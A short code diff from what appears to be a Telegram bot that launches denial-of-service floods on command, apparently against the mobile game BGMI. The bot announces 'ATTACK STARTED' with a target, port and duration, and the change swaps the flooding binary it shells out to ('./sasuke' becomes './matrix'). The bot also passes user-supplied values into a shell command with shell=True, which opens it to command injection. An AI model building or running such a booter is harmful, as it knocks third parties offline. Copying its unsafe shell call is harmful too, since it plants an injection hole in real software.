@@ -166,7 +166,7 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRiX_KiNG"
     bot.reply_to(message, response)
 
-    full_command = f"./sasuke {target} {port} {time} 200"
+    full_command = f"./matrix {target} {port} {time}"
     try:
         print(f"Executing command: {full_command}")  # Log the command
         result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
